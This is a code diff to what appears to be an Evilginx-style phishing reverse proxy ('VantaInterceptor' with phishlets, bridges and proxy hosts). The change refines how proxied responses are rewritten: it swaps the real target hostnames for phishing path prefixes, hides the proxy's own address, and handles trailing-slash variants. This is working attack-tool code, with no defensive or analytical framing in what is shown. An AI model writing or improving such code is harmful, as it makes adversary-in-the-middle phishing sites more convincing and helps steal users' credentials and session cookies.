@@ -588,12 +588,14 @@ class VantaInterceptor:
                 self.logger.info(f"SubFilter Debug: {target_hostname} | Base: {base_domain} | Replace: {f.replace}")
 
                 # 1. Check Bridge (Priority for Single Domain / Path-based routing)
+                bridge_prefix = None
                 for br in getattr(self.phishlet, "bridges", []):
                     if br.target_host == target_hostname:
                         pfx = br.prefix
                         if not pfx.startswith("/"): pfx = "/" + pfx
                         if pfx.endswith("/"): pfx = pfx[:-1]
                         phish_hostname = f"{base_domain}{pfx}"
+                        bridge_prefix = pfx
                         break
                 
                 # 2. Check ProxyHost (Subdomain mapping)
@@ -615,6 +617,9 @@ class VantaInterceptor:
                 
                 search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
                 replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
+                # If bridged, prefer path-only replacement to avoid absolute host leakage (e.g., 127.0.0.1)
+                if bridge_prefix:
+                    replace_str = bridge_prefix
                 
                 # Apply
                 try:
@@ -622,9 +627,18 @@ class VantaInterceptor:
                     # Evilginx uses string replacement usually.
                     # But Python's replace is literal.
                     # Let's try literal first.
+                    applied = False
                     if search_str in flow.response.text:
                         flow.response.text = flow.response.text.replace(search_str, replace_str)
-                        self.logger.debug(f"Applied filter: {search_str} -> {replace_str}")
+                        applied = True
+                    # Also handle trailing slash variant
+                    s2 = search_str + "/"
+                    r2 = replace_str + "/" if not replace_str.endswith("/") else replace_str
+                    if s2 in flow.response.text:
+                        flow.response.text = flow.response.text.replace(s2, r2)
+                        applied = True
+                    if applied:
+                        self.logger.debug(f"Applied filter: {search_str}[/*] -> {replace_str}[/*]")
                 except Exception:
                     pass
                     
